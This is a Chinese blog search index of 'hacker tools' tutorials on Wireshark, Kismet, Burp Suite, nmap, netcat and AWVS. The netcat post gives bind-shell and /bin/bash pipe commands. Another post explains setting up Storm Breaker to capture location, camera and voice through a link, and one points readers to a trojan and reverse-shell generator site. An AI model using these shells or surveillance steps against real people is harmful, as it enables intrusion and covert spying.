<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>wireshark抓包新手使用教程</title>
    <url>/2023/05/24/wireshark-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1、wireshark启动后，wireshark处于抓包状态中。"><a href="#1、wireshark启动后，wireshark处于抓包状态中。" class="headerlink" title="1、wireshark启动后，wireshark处于抓包状态中。"></a>1、wireshark启动后，wireshark处于抓包状态中。</h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/w1.png"></p>
<h2 id="2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。"><a href="#2、执行需要抓包的操作，如在cmd窗口下执行ping-www-baidu-com。" class="headerlink" title="2、执行需要抓包的操作，如在cmd窗口下执行ping www.baidu.com。"></a>2、执行需要抓包的操作，如在cmd窗口下执行ping <a href="http://www.baidu.com./">www.baidu.com。</a></h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031609424.png"></p>
<p>操作完成后相关数据包就抓取到了。为避免其他无用的数据包影响分析，可以通过在过滤栏设置过滤条件进行数据包列表过滤，获取结果如下。说明：ip.addr &#x3D;&#x3D; 119.75.217.26 and icmp 表示只显示ICPM协议且源主机IP或者目的主机IP为119.75.217.26的数据包。说明：协议名称icmp要小写。</p>
<h2 id="3、Wireshakr抓包界面介绍"><a href="#3、Wireshakr抓包界面介绍" class="headerlink" title="3、Wireshakr抓包界面介绍"></a>3、Wireshakr抓包界面介绍</h2><p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031626223.png"></p>
<h2 id="4、WireShark-主要分为这几个界面"><a href="#4、WireShark-主要分为这几个界面" class="headerlink" title="4、WireShark 主要分为这几个界面"></a>4、WireShark 主要分为这几个界面</h2><p>Display Filter(显示过滤器)， 用于设置过滤条件进行数据包列表过滤。菜单路径：Analyze –&gt; Display Filters。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/202306031634706.png"></p>
<p>Packet List Pane(数据包列表)， 显示捕获到的数据包，每个数据包包含编号，时间戳，源地址，目标地址，协议，长度，以及数据包信息。 不同协议的数据包使用了不同的颜色区分显示。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031649468.png"></p>
<p>Packet Details Pane(数据包详细信息), 在数据包列表中选择指定数据包，在数据包详细信息中会显示数据包的所有详细信息内容。数据包详细信息面板是最重要的，用来查看协议中的每一个字段。各行信息分别为</p>
<p> （1）Frame:  物理层的数据帧概况</p>
<p> （2）Ethernet II: 数据链路层以太网帧头部信息</p>
<p> （3）Internet Protocol Version 4: 互联网层IP包头部信息</p>
<p> （4）Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP</p>
<p> （5）Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031653476.png"></p>
<h2 id="5、TCP包的具体内容"><a href="#5、TCP包的具体内容" class="headerlink" title="5、TCP包的具体内容"></a>5、TCP包的具体内容</h2><p> 从下图可以看到wireshark捕获到的TCP包中的每个字段。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031659629.png"></p>
<h3 id="ip过滤"><a href="#ip过滤" class="headerlink" title="ip过滤"></a>ip过滤</h3><p>  ip.src &#x3D;&#x3D;192.168.1.104 显示源地址为192.168.1.104的数据包列表</p>
<p>  ip.dst&#x3D;&#x3D;192.168.1.104, 显示目标地址为192.168.1.104的数据包列表</p>
<p>  ip.addr &#x3D;&#x3D; 192.168.1.104 显示源IP地址或目标IP地址为192.168.1.104的数据包列表</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031725106.png"></p>
<h3 id="端口过滤"><a href="#端口过滤" class="headerlink" title="端口过滤"></a>端口过滤</h3><p> tcp.port &#x3D;&#x3D;80, 显示源主机或者目的主机端口为80的数据包列表。</p>
<p> tcp.srcport &#x3D;&#x3D; 80, 只显示TCP协议的源主机端口为80的数据包列表。</p>
<p> tcp.dstport &#x3D;&#x3D; 80，只显示TCP协议的目的主机端口为80的数据包列表。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031727211.png"></p>
<h2 id="Wireshark抓包分析TCP三次握手"><a href="#Wireshark抓包分析TCP三次握手" class="headerlink" title="Wireshark抓包分析TCP三次握手"></a>Wireshark抓包分析TCP三次握手</h2><p>（1）TCP三次握手连接建立过程</p>
<p>  Step1：客户端发送一个SYN&#x3D;1，ACK&#x3D;0标志的数据包给服务端，请求进行连接，这是第一次握手；</p>
<p>  Step2：服务端收到请求并且允许连接的话，就会发送一个SYN&#x3D;1，ACK&#x3D;1标志的数据包给发送端，告诉它，可以通讯了，并且让客户    端发送一个确认数据包，这是第二次握手；</p>
<p>  Step3：服务端发送一个SYN&#x3D;0，ACK&#x3D;1的数据包给客户端端，告诉它连接已被确认，这就是第三次握手。TCP连接建立，开始通讯。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306031719627.png"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title>一个能自动生成攻击载荷和监听的网站</title>
    <url>/2023/06/11/yi-ge-neng-zi-dong-sheng-cheng-gong-ji-zai-he-he-jian-ting-de-wang-zhan/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><a href="https://www.revshells.com/">https://www.revshells.com/</a></p>
<p>能够生成，安卓，PC ，苹果 木马和监听连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/5555555.png"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>网站速成木马</tag>
      </tags>
  </entry>
  <entry>
    <title>Storm Breaker使用教程</title>
    <url>/2023/06/10/storm-breaker/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Storm-Breaker（战斧）"><a href="#Storm-Breaker（战斧）" class="headerlink" title="Storm Breaker（战斧）"></a>Storm Breaker（战斧）</h1><h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>本工具是在GitHub上大神出品。能够在定位，获取视频，监听通话内容。极品工具。</p>
<p>作者源码和目前的更新的系统有冲突，经过改写源码后，在marjiaro linux 系统中安装成功使用。</p>
<p>源码地址：<a href="https://github.com/ultrasecurity/Storm-Breaker.git">https://github.com/ultrasecurity/Storm-Breaker.git</a></p>
<h2 id="2、依赖关系"><a href="#2、依赖关系" class="headerlink" title="2、依赖关系"></a>2、依赖关系</h2><p>**<code>Storm Breaker</code>**需要以下程序才能正常运行 -</p>
<ul>
<li><code>php</code></li>
<li><code>python3</code></li>
<li><code>git</code></li>
<li>Ngrok</li>
</ul>
<h2 id="3、安装步骤"><a href="#3、安装步骤" class="headerlink" title="3、安装步骤"></a>3、安装步骤</h2><p>1、安装Ngrok</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/s1.png"></p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686389156/s2_rtirzk.png"></p>
<p>2、生成这个token</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686389403/s3_yuexjf.png"></p>
<p>3、安装后如图</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686389622/st1_eye0ls.png"></p>
<p>4、安装</p>
<h3 id="在-Kali-Linux-上安装"><a href="#在-Kali-Linux-上安装" class="headerlink" title="在 Kali Linux 上安装"></a>在 Kali Linux 上安装</h3><pre class=" language-shell"><code class="language-shell">$ git clone https://github.com/ultrasecurity/Storm-Breaker.git
$ cd Storm-Breaker
$ sudo bash install.sh
$ sudo pip3 install -r requirements.txt
$ sudo python3 st.py
</code></pre>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686390311/st2_l8hbdw.png"></p>
<p>ngrok http 2525 在终端中运行如图下</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686391430/s4_ytbag1.png"></p>
<p>在谷歌浏览器中打开连接</p>
<p><a href="https://69b2-121-29-169-133.ngrok-free.app/">https://69b2-121-29-169-133.ngrok-free.app</a>  </p>
<p>用户名和密码都是：admin</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686391771/s5_kvydkz.png"></p>
<p>进入后</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686392023/s6_wviipc.png"></p>
<p>复制连接在浏览器打开，可以换域名或者整个连接</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686392723/s7_jwv2oz.png"></p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686392722/s10_nwalyb.png"></p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686392722/s9_unulfg.png"></p>
<p>连接有语音，还有摄像头，第一个连接，这里就不演示了，可以自己尝试，谢谢。</p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>Storm Breaker</tag>
      </tags>
  </entry>
  <entry>
    <title>Kismet使用教程</title>
    <url>/2023/05/24/kismet-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Kismet"><a href="#Kismet" class="headerlink" title="Kismet"></a>Kismet</h1><p>Kismet是列表中最流行的工具之一。它是一个开源的解决方案，可以作为802.11无线局域网的网络检测器、数据包嗅探器和入侵检测系统。任何支持原始监控模式并能够嗅探802.11a、802.11b、802.11g和802.11n流量的无线卡都将与Kismet兼容。Linux、FreeBSD、NetBSD、 OpenBSD和Mac OS X都支持该程序。客户端也可以在Windows上运行。</p>
<p>主要特点：</p>
<ul>
<li><p>可以在不同类型的操作系统上使用；</p>
</li>
<li><p>支持原始监控模式；</p>
</li>
<li><p>借助数据流量，它可以被动地识别网络，收集数据包，并发现非信标和隐藏的网络；</p>
</li>
</ul>
<p>如果要进行无线网络渗透测试，则必须先扫描所有有效的无线接入点。刚好在Kali Linux中，提供了一款嗅探无线网络工具Kismet。使用该工具可以测量周围的无线信号，并查看所有可用的无线接入点。本节将介绍使用Kismet工具嗅探无线网络。</p>
<p>（1）启动Kismet工具。执行命令如下所示：</p>
<pre class=" language-shell"><code class="language-shell">root@kali:~# kismet
</code></pre>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686194588/00419_h0y6gx.jpg"></p>
<p>(2) 扫描的无线信息</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686194817/00427_szu0s1.jpg"></p>
<p>很老的软件，kali linux 自带，简单搜索用一下，有很多替代的新功能软件。</p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>Kismet</tag>
      </tags>
  </entry>
  <entry>
    <title>Burp Suite使用技巧</title>
    <url>/2023/04/21/burp-suite-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h1><p>Burp Suite是任何道德黑客武器库的重要组成部分。作为评估网站安全性的可靠工具，它是一个代理工具，能够拦截用户浏览器和目标网站之间的请求和响应，还提供了对网站功能的可见性。这使得道德黑客有能力改变这些请求，利用网站上的安全漏洞或访问受限制的部分。</p>
<p>该解决方案有三种版本：免费版、专业版和企业版。</p>
<p>主要特点：</p>
<ul>
<li>轻松点击即可实现全自动动态扫描；</li>
<li>开箱即用的扫描配置；</li>
<li>基于角色的访问控制和单点登录；</li>
<li>CI集成；</li>
<li>超过250个自定义测试工作流扩展；</li>
</ul>
<ol>
<li><p>Target(目标)——显示目标目录结构的的一个功能</p>
</li>
<li><p>Proxy(代理)——拦截HTTP&#x2F;S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p>
</li>
<li><p>Spider(蜘蛛)——应用智能感应的网络爬虫，它能完整的枚举应用程序的内容和功能。</p>
</li>
<li><p>Scanner(扫描器)——高级工具，执行后，它能自动地发现web 应用程序的安全漏洞。</p>
</li>
<li><p>Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing 技术探测常规漏洞。</p>
</li>
<li><p>Repeater(中继器)——一个靠手动操作来触发单独的HTTP 请求，并分析应用程序响应的工具。</p>
</li>
<li><p>Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具。</p>
</li>
<li><p>Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具。</p>
</li>
<li><p>Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异”。</p>
</li>
<li><p>Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能。</p>
</li>
<li><p>Options(设置)——对Burp Suite的一些设置。</p>
</li>
</ol>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686188383/b1_twy2v9.png"></p>
<p><strong>捕获HTTP数据包：</strong></p>
<p>以firefox火狐浏览器为例：点击选项——高级——网络——设置——选择手动配置代理,HTTP代理输入：127.0.0.1端口：8080</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686188477/b2_mxs5ak.png"></p>
<p>打开burpsuite，点击proxy——Options勾选127.0.0.1:8080。在Intercept点击后显示Intercept on，启动。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686188622/b3_ggs3f2.png"></p>
<p>在firefox浏览器输入访问的真实地址，列如在网址输入10.1.1.174&#x2F;login.php，username输入test，password也输入test。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686188622/b4_f4odsc.png"></p>
<p>点击Login，页面卡住了，下面burpsuite闪框提示有新的数据传入，打开看抓包信息。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686188623/b5_ybymnm.png"></p>
<p><strong>爬虫：</strong></p>
<p>在Target可以看到网站的目录结构。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189191/b6_hi628b.png"></p>
<p>可以选择只显示有回显的数据或网站，勾上下面红框框住的选项就可以了。如果只选择当前需要的一个网站，勾选Show only in-scope items。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189305/b7_a5pfvo.png"></p>
<p>右键点击选择Spider this host（爬虫到该主机），并点击YES。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189405/b8_orhwga.png"></p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189405/b9_j5kiep.png"></p>
<p>可以看到加载进了下列展示的标签。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189555/b10_xgw4ky.png"></p>
<p>如果不填写任何表单，可在Spide——options，勾选如下设置。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189625/b11_xmfchs.png"></p>
<p>在下面页面可以看到一共爬取了2万多比特。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189693/b12_n36cac.png"></p>
<p>爬完之后可以看到爬取的目录。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189779/b13_zmcxlm.png"></p>
<p><strong>扫描漏洞：</strong></p>
<p>双击para，会选中有参数的记录。右键点击Actively scan selected items选项。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189954/b14_lellm4.png"></p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686189952/b15_f9bdsr.jpg"></p>
<p>就会自动过滤重复的页面或数据，然后点next——点ok。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686190207/b16_ddcedd.png"></p>
<p>再Scanner——Scan queue就可以看到扫描的情况。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686190316/b17_xofhrh.jpg"></p>
<p>再Scanner下的Issue defintion可以定义扫什么样的漏洞。</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686190388/b18_gudzct.jpg"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>Burp Suite</tag>
      </tags>
  </entry>
  <entry>
    <title>Invicti v22.11.0破解版（原Netsparker)</title>
    <url>/2023/04/21/invicti-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="Invicti"><a href="#Invicti" class="headerlink" title="Invicti"></a>Invicti</h3><p>Invicti，之前名为Netsparker，是一个基于web的应用程序安全扫描黑客工具，能够发现SQL注入、XSS、web应用程序中的漏洞。</p>
<p>主要特点：</p>
<ul>
<li>它需要最小的配置；</li>
<li>它可以在24小时内扫描1000多个网络应用程序；</li>
<li>自动检测URL重写规则和自定义404错误页面；</li>
<li>在特殊的基于证明的扫描技术的帮助下，它能以惊人的准确性发现漏洞；</li>
</ul>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686187562/4a471668222737_iapjh5.png"></p>
<p>大型企业一般都用，所以在做大型任务时候，必备神器！</p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>invicti</tag>
      </tags>
  </entry>
  <entry>
    <title>netcat使用技巧</title>
    <url>/2023/04/21/netcat-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Netcat常用参数"><a href="#Netcat常用参数" class="headerlink" title="Netcat常用参数"></a>Netcat常用参数</h2><ul>
<li>-l： 开启监听</li>
<li>-p：指定端口</li>
<li>-t： 以telnet形式应答</li>
<li>-e：程序重定向</li>
<li>-n：以数字形式表示ip</li>
<li>-v：显示执行命令过程</li>
<li>-z : 不进行交互，直接显示结果</li>
<li>-u ：使用UDP协议传输</li>
<li>-w : 设置超时时间</li>
</ul>
<h2 id="netcat-的对话功能"><a href="#netcat-的对话功能" class="headerlink" title="netcat 的对话功能"></a>netcat 的对话功能</h2><pre class=" language-shell"><code class="language-shell">win8: nc64.ext  -l  -p  4444  (监听 4444端口)
kali ：nc   192.168.49.130  4444  
</code></pre>
<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/win10.png" alt="win10" style="zoom: 80%;" />



<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/kali.png" alt="kali" style="zoom:80%;" />

<h2 id="netcat的返回一个shell-（注意：win8是服务端，kali是客户端）"><a href="#netcat的返回一个shell-（注意：win8是服务端，kali是客户端）" class="headerlink" title="netcat的返回一个shell （注意：win8是服务端，kali是客户端）"></a>netcat的返回一个shell （注意：win8是服务端，kali是客户端）</h2><pre class=" language-shell"><code class="language-shell">win8: nc64.ext  -l  -p  4444 -e cmd.exe (监听 4444端口)
kali ：nc   192.168.49.130  4444  
</code></pre>
<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/13.png" style="zoom:80%;" />

<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/12.png" style="zoom:80%;" />

<h2 id="netcat-的传输文件功能"><a href="#netcat-的传输文件功能" class="headerlink" title="netcat 的传输文件功能"></a>netcat 的传输文件功能</h2><pre class=" language-shell"><code class="language-shell">win8: nc64.exe -l -p 4444 < reademe.txt  ("<" :上传功能)
kali : nc 192.168.0.105 4444 > gf2023 (">" 输出重定向功能)
</code></pre>
<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/win8.png" alt="win8" style="zoom:80%;" />



<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/15.png" alt="kali" style="zoom:80%;" />

<h2 id="netcat-在被控制的服务器中禁止使用-E参数技巧"><a href="#netcat-在被控制的服务器中禁止使用-E参数技巧" class="headerlink" title="netcat 在被控制的服务器中禁止使用-E参数技巧"></a>netcat 在被控制的服务器中禁止使用-E参数技巧</h2><pre class=" language-shell"><code class="language-shell">win8:nc64.ext -lvp 4444          nc64.ext -lvp 4445    开启两个监听接口
kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445 
</code></pre>
<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/1.png" alt="win8" style="zoom:80%;" />

<img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag/test/2.png" alt="kali" style="zoom:80%;" />

]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>netcat</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap使用教程</title>
    <url>/2023/04/06/nmap-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Nmap-简介"><a href="#Nmap-简介" class="headerlink" title="Nmap 简介"></a>Nmap 简介</h2><p>nmap 是一个开源、免费的网络探测工具，适用于&#96;windows、linux、mac 等多种操作系统。能够快速扫描大型网络或者单个主机，可以发现网络上有哪些主机，这些主机提供什么服务，服务运行在什么操作系统（包括版本系统），扩大攻击范围。</p>
<ul>
<li>识别目标网络内活跃主机</li>
<li>扫描主机端口</li>
<li>探测主机的操作系统</li>
<li>利用自带脚本检测漏洞</li>
</ul>
<h2 id="基本快速扫描"><a href="#基本快速扫描" class="headerlink" title="基本快速扫描"></a>基本快速扫描</h2><pre class=" language-shell"><code class="language-shell">nmap 172.20.10.2
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306040958659.png"></p>
<h2 id="快速扫描多个目标"><a href="#快速扫描多个目标" class="headerlink" title="快速扫描多个目标"></a>快速扫描多个目标</h2><pre class=" language-shell"><code class="language-shell">nmap  14.215.177.39 172.20.10.2
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041005514.png"></p>
<h2 id="详细描述输出扫描"><a href="#详细描述输出扫描" class="headerlink" title="详细描述输出扫描"></a>详细描述输出扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -vv 14.215.177.39
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041009486.png"></p>
<h2 id="指定端口和范围扫描"><a href="#指定端口和范围扫描" class="headerlink" title="指定端口和范围扫描"></a>指定端口和范围扫描</h2><pre class=" language-shell"><code class="language-shell">namp -p 3389,20-200 192.168.227.133
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041013726.png"></p>
<h2 id="扫描除所有子网主机"><a href="#扫描除所有子网主机" class="headerlink" title="扫描除所有子网主机"></a>扫描除所有子网主机</h2><pre class=" language-shell"><code class="language-shell">nmap 192.168.227.1/24 
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041021800.png"></p>
<h2 id="显示扫描的所有主机的列表"><a href="#显示扫描的所有主机的列表" class="headerlink" title="显示扫描的所有主机的列表"></a>显示扫描的所有主机的列表</h2><pre class=" language-shell"><code class="language-shell">nmap -sL 192.168.227.1/24
</code></pre>
<h2 id="sP-ping-扫描"><a href="#sP-ping-扫描" class="headerlink" title="sP ping 扫描"></a>sP ping 扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -sP 192.168.227.1-255
</code></pre>
<p>我们会用这个命令去扫描内网的一个ip范围，用来做内网的主机发现。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041136754.png"></p>
<h2 id="sS-SYN半开放扫描"><a href="#sS-SYN半开放扫描" class="headerlink" title="sS SYN半开放扫描"></a>sS SYN半开放扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -sS 192.168.227.1 
</code></pre>
<p>因为这种技术使得Nmap不需要通过完整的握手，就能获得远程主机的信息。Nmap发送SYN包到远程主机，但是它不会产生任何会话.因此不会在目标主机上产生任何日志记录,因为没有形成会话。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041149707.png"></p>
<h2 id="sT-TCP扫描"><a href="#sT-TCP扫描" class="headerlink" title="sT TCP扫描"></a>sT TCP扫描</h2><pre class=" language-shell"><code class="language-shell">nmap -sT 192.168.227.133
</code></pre>
<p>只适用于找出TCP和UDP端口。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/202306041153400.png"></p>
<h2 id="O-OS操作系统类型的探测"><a href="#O-OS操作系统类型的探测" class="headerlink" title="O OS操作系统类型的探测"></a>O OS操作系统类型的探测</h2><pre class=" language-shell"><code class="language-shell">nmap -O 192.168.227.133
</code></pre>
<p>用来了解远程主机的操作系统和软件是非常有用的，通过获取的信息你可以知道已知的漏洞。</p>
<p><img src="https://cdn.jsdelivr.net/gh/matane100/blog-imag@main/test/20200619085402268.png"></p>
<h2 id="osscan-guess-猜测匹配操作系统"><a href="#osscan-guess-猜测匹配操作系统" class="headerlink" title="osscan-guess 猜测匹配操作系统"></a>osscan-guess 猜测匹配操作系统</h2><pre class=" language-shell"><code class="language-shell">nmap -O --osscan-guess 192.168.227.133
</code></pre>
<p>猜测认为最接近目标的匹配操作系统类型.</p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1685856242/zhngqi_nxbdsh.png"></p>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>AWVS扫描使用教程</title>
    <url>/2023/04/01/awvs-shi-yong-jiao-cheng/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="AWVS-Web-Scanner使用教程"><a href="#AWVS-Web-Scanner使用教程" class="headerlink" title="AWVS-Web Scanner使用教程"></a><em>AWVS-Web Scanner使用教程</em></h1><p>Acunetix是道德黑客用来阻止恶意攻击者获得未经授权访问的自动化工具。JavaScript、HTML5和单页应用程序都可以作为安全扫描器被它扫描。它可以保护web应用程序免受一些网络缺陷的影响。</p>
<p>主要特点：</p>
<ul>
<li>它可以扫描超过4000种类型的漏洞，包括SQL注入、XSS等；</li>
<li>可作为内部部署或基于云的解决方案；</li>
<li>它能够检测WordPress主题，核心和插件漏洞；</li>
<li>它可以与问题跟踪器集成，解决SDLC中的问题；</li>
<li>HTML5支持；</li>
</ul>
<h3 id="一、不需要登录的扫描"><a href="#一、不需要登录的扫描" class="headerlink" title="一、不需要登录的扫描"></a>一、不需要登录的扫描</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686183724/a1_jrrysj.png"></p>
<h3 id="第二步：等待结果即可"><a href="#第二步：等待结果即可" class="headerlink" title="第二步：等待结果即可"></a>第二步：等待结果即可</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686183923/a2_mgbzip.png"></p>
<h2 id="二、需要登陆的扫描"><a href="#二、需要登陆的扫描" class="headerlink" title="二、需要登陆的扫描"></a>二、需要登陆的扫描</h2><h3 id="第一步：新建扫描"><a href="#第一步：新建扫描" class="headerlink" title="第一步：新建扫描"></a>第一步：新建扫描</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184353/a3_iywvmj.png"></p>
<h3 id="第二步：输入目标IP地址，点击next"><a href="#第二步：输入目标IP地址，点击next" class="headerlink" title="第二步：输入目标IP地址，点击next"></a>第二步：输入目标IP地址，点击next</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184521/a4_zmp5vd.png"></p>
<h3 id="第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next"><a href="#第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next" class="headerlink" title="第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next"></a>第三步：很多模块的漏洞测试，选择默认（默认是所有漏洞都检测），点击next</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686184639/a5_prqg8x.png"></p>
<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686185306/a6_xpdvfk.png"></p>
<h3 id="第四步：点击录制用户名密码"><a href="#第四步：点击录制用户名密码" class="headerlink" title="第四步：点击录制用户名密码"></a>第四步：点击录制用户名密码</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686185476/a7_msfpfr.png"></p>
<h3 id="打开之后界面如下图所示，输入用户名密码，验证码"><a href="#打开之后界面如下图所示，输入用户名密码，验证码" class="headerlink" title="打开之后界面如下图所示，输入用户名密码，验证码"></a>打开之后界面如下图所示，输入用户名密码，验证码</h3><p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686185686/a8_sb9amh.png"></p>
